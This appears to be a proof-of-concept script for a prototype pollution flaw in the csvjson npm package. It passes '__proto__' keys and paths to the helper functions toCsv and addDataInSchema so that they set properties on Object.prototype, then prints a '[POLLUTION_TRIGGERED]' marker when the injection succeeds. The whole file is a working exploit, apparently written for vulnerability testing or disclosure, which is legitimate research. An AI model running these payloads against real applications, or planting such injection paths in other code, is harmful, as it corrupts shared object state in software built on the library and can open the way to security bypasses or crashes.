// Define the necessary variables
const data = "pollutedValue"; // The value to inject
const table = {}; // Example table
const opt = {}; // Example options

// Inject a non-existent property into Object.prototype
require("csvjson/src/helper").toCsv(data, table, "__proto__", "pollutedProperty", opt);

// Verification
console.log({}.pollutedProperty !== undefined ? '[POLLUTION_TRIGGERED]':'');




require("csvjson/src/helper").addDataInSchema("__proto__.pollutedProp", "pollutedValue", {}, ",", "\"");
console.log({}.pollutedProp !== undefined ? '[POLLUTION_TRIGGERED]':'');